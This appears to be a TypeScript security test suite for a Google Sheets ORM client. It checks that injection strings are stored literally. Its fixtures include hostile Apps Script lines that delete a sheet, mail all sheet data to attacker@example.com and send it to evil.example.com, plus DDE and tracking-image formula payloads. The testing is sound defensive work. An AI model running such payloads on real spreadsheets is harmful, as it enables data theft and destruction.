import { GassmaClient } from "../../generated/gassma/gassmaClient";
import { assertEquals } from "../../assert/assertEquals";
import { getSheetSnapshot } from "../../assert/getSheetSnapshot";
import { resetSheet } from "../../reset/resetSheet";
import { productData } from "../../consts/productData";

function testInjection() {
  const client = new GassmaClient();

  testCreateWithGasCode(client);
  testCreateWithJsonString(client);
  testCreateWithFormulaInjection(client);
  testCreateWithSpecialCharacters(client);
  testWhereWithGasCode(client);
  testWhereWithJsonString(client);
  testWhereContainsRegexMetaChars(client);
  testWhereStartsWithRegexMetaChars(client);
  testWhereEndsWithRegexMetaChars(client);
  testUpdateWithGasCode(client);
  testUpdateWithFormulaInjection(client);
  testRegexInjectionContainsDot(client);
  testRegexInjectionContainsDotStar(client);
  testRegexInjectionStartsWithCaret(client);
  testPrototypePollutionCreate(client);
  testPrototypePollutionWhere(client);
  testPrototypePollutionUpdate(client);
  testCreateWithArrayFormulaInjection(client);
  testCreateWithDeepArrayFormulaInjection(client);
  testUpdateWithArrayFormulaInjection(client);
  testCreateManyWithArrayFormulaInjection(client);

  Logger.log("✅ testInjection: all passed");
}

function testCreateWithGasCode(client: GassmaClient) {
  const gasCode = 'SpreadsheetApp.getActiveSpreadsheet().deleteSheet(SpreadsheetApp.getActiveSpreadsheet().getSheetByName("Product"))';

  const result = client.Product.create({
    data: {
      id: 900,
      name: gasCode,
      price: 100,
      stock: 1,
      status: "available",
      createdAt: new Date("2025-01-01T00:00:00"),
    },
  });

  assertEquals(result.name, gasCode, "create GAS code: return value should be plain string");

  const snapshot = getSheetSnapshot("Product");
  snapshot.assertRowExists({ id: 900 });
  snapshot.assertRowEquals({ id: 900 }, { name: gasCode });

  resetSheet("Product", productData);
}

function testCreateWithJsonString(client: GassmaClient) {
  const jsonPayload = JSON.stringify({
    action: "deleteSheet",
    target: "Product",
    code: "GmailApp.sendEmail('attacker@example.com', 'data', JSON.stringify(SpreadsheetApp.getActiveSpreadsheet().getDataRange().getValues()))",
  });

  const result = client.Product.create({
    data: {
      id: 901,
      name: jsonPayload,
      price: 200,
      stock: 1,
      status: "available",
      createdAt: new Date("2025-01-01T00:00:00"),
    },
  });

  assertEquals(result.name, jsonPayload, "create JSON: return value should be plain string");

  const snapshot = getSheetSnapshot("Product");
  snapshot.assertRowExists({ id: 901 });
  snapshot.assertRowEquals({ id: 901 }, { name: jsonPayload });

  resetSheet("Product", productData);
}

function testCreateWithFormulaInjection(client: GassmaClient) {
  const formulas = [
    "=1+1",
    "=IMPORTRANGE(\"https://docs.google.com/spreadsheets/d/xxx\",\"Sheet1!A1\")",
    "=IMAGE(\"https://evil.example.com/tracker.png\")",
    "+cmd|'/C calc'!A0",
    "-1+1",
    "@SUM(A1:A10)",
  ];

  formulas.forEach((formula, i) => {
    const id = 910 + i;
    client.Product.create({
      data: {
        id: id,
        name: formula,
        price: 100,
        stock: 1,
        status: "available",
        createdAt: new Date("2025-01-01T00:00:00"),
      },
    });

    // idで検索して文字列として保存されていることを確認
    const findById = client.Product.findFirstOrThrow({
      where: { id: id },
    });

    if (typeof findById.name !== "string") {
      throw new Error(`formula injection id=${id}: name should be string, got ${typeof findById.name}`);
    }
    assertEquals(findById.name, formula, `formula injection id=${id}: value should be preserved`);

    // nameで検索して元の値でヒットすることを確認（可逆性の検証）
    const findByName = client.Product.findFirstOrThrow({
      where: { name: formula },
    });
    assertEquals(findByName.id, id, `formula injection id=${id}: should be findable by name`);
  });

  resetSheet("Product", productData);
}

function testUpdateWithFormulaInjection(client: GassmaClient) {
  const formula = "=SUM(A1:A10)";

  client.Product.update({
    where: { id: 1 },
    data: { name: formula },
  });

  const findResult = client.Product.findFirstOrThrow({
    where: { id: 1 },
  });

  if (typeof findResult.name !== "string") {
    throw new Error(`update formula injection: name should be string, got ${typeof findResult.name}`);
  }
  assertEquals(findResult.name, formula, "update formula injection: value should be preserved");

  // nameで検索して元の値でヒットすることを確認
  const findByName = client.Product.findFirstOrThrow({
    where: { name: formula },
  });
  assertEquals(findByName.id, 1, "update formula injection: should be findable by name");

  resetSheet("Product", productData);
}

function testCreateWithSpecialCharacters(client: GassmaClient) {
  const specialNames = [
    "test\0null",
    "test\ttab",
    "test\nnewline",
    'test"doublequote"end',
    "test'singlequote'end",
    "test\\backslash\\end",
    "テスト<script>alert('xss')</script>",
    "test${`template`}literal",
  ];

  specialNames.forEach((name, i) => {
    const id = 920 + i;
    client.Product.create({
      data: {
        id: id,
        name: name,
        price: 100,
        stock: 1,
        status: "available",
        createdAt: new Date("2025-01-01T00:00:00"),
      },
    });

    const findResult = client.Product.findFirstOrThrow({
      where: { id: id },
    });

    if (typeof findResult.name !== "string") {
      throw new Error(`special chars id=${id}: name should be string, got ${typeof findResult.name}`);
    }
  });

  resetSheet("Product", productData);
}

function testWhereWithGasCode(client: GassmaClient) {
  const gasCode = 'SpreadsheetApp.getActiveSpreadsheet().deleteSheet(SpreadsheetApp.getActiveSpreadsheet().getSheetByName("Product"))';

  const results = client.Product.findMany({
    where: { name: gasCode },
  });

  assertEquals(results.length, 0, "where GAS code: should return 0 records");
}

function testWhereWithJsonString(client: GassmaClient) {
  const jsonPayload = JSON.stringify({
    $where: "function() { return true; }",
    name: { $regex: ".*" },
  });

  const results = client.Product.findMany({
    where: { name: jsonPayload },
  });

  assertEquals(results.length, 0, "where JSON/NoSQL injection: should return 0 records");
}

function testWhereContainsRegexMetaChars(client: GassmaClient) {
  client.Product.create({
    data: {
      id: 930,
      name: "test.product",
      price: 100,
      stock: 1,
      status: "available",
      createdAt: new Date("2025-01-01T00:00:00"),
    },
  });

  client.Product.create({
    data: {
      id: 931,
      name: "testXproduct",
      price: 100,
      stock: 1,
      status: "available",
      createdAt: new Date("2025-01-01T00:00:00"),
    },
  });

  const results = client.Product.findMany({
    where: { name: { contains: "t.p" } },
  });

  const matchedIds = results.map((r) => r.id);

  if (matchedIds.indexOf(930) === -1) {
    throw new Error("contains regex: should match 'test.product' (literal dot)");
  }
  if (matchedIds.indexOf(931) !== -1) {
    throw new Error("contains regex: 'testXproduct' should NOT match 't.p' (dot must be literal, not regex wildcard)");
  }

  resetSheet("Product", productData);
}

function testWhereStartsWithRegexMetaChars(client: GassmaClient) {
  client.Product.create({
    data: {
      id: 932,
      name: ".*allMatch",
      price: 100,
      stock: 1,
      status: "available",
      createdAt: new Date("2025-01-01T00:00:00"),
    },
  });

  const results = client.Product.findMany({
    where: { name: { startsWith: ".*" } },
  });

  assertEquals(results.length, 1, "startsWith '.*': should match only '.*allMatch'");
  assertEquals(results[0].id, 932, "startsWith '.*': should match id=932");

  resetSheet("Product", productData);
}

function testWhereEndsWithRegexMetaChars(client: GassmaClient) {
  client.Product.create({
    data: {
      id: 933,
      name: "product(v1)",
      price: 100,
      stock: 1,
      status: "available",
      createdAt: new Date("2025-01-01T00:00:00"),
    },
  });

  const results = client.Product.findMany({
    where: { name: { endsWith: "(v1)" } },
  });

  assertEquals(results.length, 1, "endsWith '(v1)': should match only 'product(v1)'");
  assertEquals(results[0].id, 933, "endsWith '(v1)': should match id=933");

  resetSheet("Product", productData);
}

function testUpdateWithGasCode(client: GassmaClient) {
  const gasCode = 'UrlFetchApp.fetch("https://evil.example.com/steal?data=" + SpreadsheetApp.getActiveSpreadsheet().getDataRange().getValues())';

  client.Product.update({
    where: { id: 1 },
    data: { name: gasCode },
  });

  const snapshot = getSheetSnapshot("Product");
  snapshot.assertRowEquals({ id: 1 }, { name: gasCode });

  const findResult = client.Product.findFirstOrThrow({
    where: { id: 1 },
  });
  assertEquals(findResult.name, gasCode, "update GAS code: should be stored as plain string");

  resetSheet("Product", productData);
}

function testRegexInjectionContainsDot(client: GassmaClient) {
  client.Product.create({
    data: {
      id: 940,
      name: "test.product",
      price: 100,
      stock: 1,
      status: "available",
      createdAt: new Date("2025-01-01T00:00:00"),
    },
  });
  client.Product.create({
    data: {
      id: 941,
      name: "testXproduct",
      price: 100,
      stock: 1,
      status: "available",
      createdAt: new Date("2025-01-01T00:00:00"),
    },
  });

  const results = client.Product.findMany({
    where: { name: { contains: "t.p" } },
  });

  const matchedIds = results.map((r) => r.id);

  if (matchedIds.indexOf(940) === -1) {
    throw new Error("regex dot: 'test.product' should match contains 't.p'");
  }
  if (matchedIds.indexOf(941) !== -1) {
    throw new Error("regex dot: 'testXproduct' should NOT match contains 't.p' (dot must be literal)");
  }

  resetSheet("Product", productData);
}

function testRegexInjectionContainsDotStar(client: GassmaClient) {
  const results = client.Product.findMany({
    where: { name: { contains: ".*" } },
  });

  assertEquals(results.length, 0, "contains '.*': should match 0 records (literal, not regex)");
}

function testRegexInjectionStartsWithCaret(client: GassmaClient) {
  const results = client.Product.findMany({
    where: { name: { startsWith: "^" } },
  });

  assertEquals(results.length, 0, "startsWith '^': should match 0 records (literal, not regex anchor)");
}

function testPrototypePollutionCreate(client: GassmaClient) {
  const protoPayloads = ["__proto__", "constructor", "prototype"];

  protoPayloads.forEach((payload, i) => {
    const id = 950 + i;
    client.Product.create({
      data: {
        id: id,
        name: payload,
        price: 100,
        stock: 1,
        status: "available",
        createdAt: new Date("2025-01-01T00:00:00"),
      },
    });

    const result = client.Product.findFirstOrThrow({
      where: { id: id },
    });

    assertEquals(result.name, payload, `proto pollution create id=${id}: value should be preserved as '${payload}'`);
  });

  // Object.prototype が汚染されていないことを確認
  const clean: Record<string, unknown> = {};
  if ("polluted" in clean) {
    throw new Error("prototype pollution: Object.prototype was polluted after create");
  }

  resetSheet("Product", productData);
}

function testPrototypePollutionWhere(client: GassmaClient) {
  // __proto__ をnameとして持つレコードを作成し、whereで検索
  client.Product.create({
    data: {
      id: 960,
      name: "__proto__",
      price: 100,
      stock: 1,
      status: "available",
      createdAt: new Date("2025-01-01T00:00:00"),
    },
  });

  const results = client.Product.findMany({
    where: { name: "__proto__" },
  });

  assertEquals(results.length, 1, "proto pollution where: should find 1 record with name '__proto__'");
  assertEquals(results[0].id, 960, "proto pollution where: should match id=960");

  // containsでの検索
  const containsResults = client.Product.findMany({
    where: { name: { contains: "__proto__" } },
  });
  assertEquals(containsResults.length, 1, "proto pollution contains: should find 1 record");

  // Object.prototype が汚染されていないことを確認
  const clean: Record<string, unknown> = {};
  if ("polluted" in clean) {
    throw new Error("prototype pollution: Object.prototype was polluted after where");
  }

  resetSheet("Product", productData);
}

function testPrototypePollutionUpdate(client: GassmaClient) {
  // レコードのnameを __proto__ に更新
  client.Product.update({
    where: { id: 1 },
    data: { name: "__proto__" },
  });

  const result = client.Product.findFirstOrThrow({
    where: { id: 1 },
  });

  assertEquals(result.name, "__proto__", "proto pollution update: value should be '__proto__'");

  // constructorに更新
  client.Product.update({
    where: { id: 1 },
    data: { name: "constructor" },
  });

  const result2 = client.Product.findFirstOrThrow({
    where: { id: 1 },
  });

  assertEquals(result2.name, "constructor", "proto pollution update: value should be 'constructor'");

  // Object.prototype が汚染されていないことを確認
  const clean: Record<string, unknown> = {};
  if ("polluted" in clean) {
    throw new Error("prototype pollution: Object.prototype was polluted after update");
  }

  resetSheet("Product", productData);
}

function testCreateWithArrayFormulaInjection(client: GassmaClient) {
  // 1次元配列で数式を渡す（GoogleFormのnamedValuesパターン）
  client.Product.create({
    data: {
      id: 970,
      name: ["=IMPORTRANGE(\"https://docs.google.com/spreadsheets/d/xxx\",\"A1\")"] as any,
      price: 100,
      stock: 1,
      status: "available",
      createdAt: new Date("2025-01-01T00:00:00"),
    },
  });

  const result = client.Product.findFirstOrThrow({
    where: { id: 970 },
  });

  if (typeof result.name !== "string") {
    throw new Error(`array formula injection: name should be string, got ${typeof result.name}`);
  }

  // 数式として実行されていないことを確認（数値や#REFにならない）
  const nameStr = String(result.name);
  if (!nameStr.startsWith("'")) {
    throw new Error(`array formula injection: name should be escaped with leading quote, got '${nameStr}'`);
  }

  resetSheet("Product", productData);
}

function testCreateWithDeepArrayFormulaInjection(client: GassmaClient) {
  // 深いネスト配列で数式を渡す
  const deepArrays: { id: number; value: any; label: string }[] = [
    { id: 971, value: [["=1+1"]], label: "2次元配列" },
    { id: 972, value: [[["=SUM(A1:A10)"]]], label: "3次元配列" },
    { id: 973, value: [[[["=IMAGE(\"https://evil.com\")"]]]], label: "4次元配列" },
  ];

  deepArrays.forEach(({ id, value, label }) => {
    client.Product.create({
      data: {
        id: id,
        name: value,
        price: 100,
        stock: 1,
        status: "available",
        createdAt: new Date("2025-01-01T00:00:00"),
      },
    });

    const result = client.Product.findFirstOrThrow({
      where: { id: id },
    });

    if (typeof result.name !== "string") {
      throw new Error(`deep array ${label}: name should be string, got ${typeof result.name}`);
    }

    const nameStr = String(result.name);
    if (!nameStr.startsWith("'")) {
      throw new Error(`deep array ${label}: name should be escaped with leading quote, got '${nameStr}'`);
    }
  });

  resetSheet("Product", productData);
}

function testUpdateWithArrayFormulaInjection(client: GassmaClient) {
  // updateで配列数式を渡す
  client.Product.update({
    where: { id: 1 },
    data: { name: ["=1+1"] as any },
  });

  const result = client.Product.findFirstOrThrow({
    where: { id: 1 },
  });

  if (typeof result.name !== "string") {
    throw new Error(`update array formula: name should be string, got ${typeof result.name}`);
  }

  const nameStr = String(result.name);
  if (!nameStr.startsWith("'")) {
    throw new Error(`update array formula: name should be escaped with leading quote, got '${nameStr}'`);
  }

  resetSheet("Product", productData);
}

function testCreateManyWithArrayFormulaInjection(client: GassmaClient) {
  // createManyで配列数式を渡す
  client.Product.createMany({
    data: [
      {
        id: 980,
        name: ["=1+1"] as any,
        price: 100,
        stock: 1,
        status: "available",
        createdAt: new Date("2025-01-01T00:00:00"),
      },
      {
        id: 981,
        name: [["=IMPORTRANGE(\"url\",\"A1\")"]] as any,
        price: 200,
        stock: 2,
        status: "available",
        createdAt: new Date("2025-01-01T00:00:00"),
      },
    ],
  });

  const result1 = client.Product.findFirstOrThrow({ where: { id: 980 } });
  const result2 = client.Product.findFirstOrThrow({ where: { id: 981 } });

  const name1 = String(result1.name);
  const name2 = String(result2.name);

  if (!name1.startsWith("'")) {
    throw new Error(`createMany array formula id=980: name should be escaped, got '${name1}'`);
  }
  if (!name2.startsWith("'")) {
    throw new Error(`createMany array formula id=981: name should be escaped, got '${name2}'`);
  }

  resetSheet("Product", productData);
}

export { testInjection };
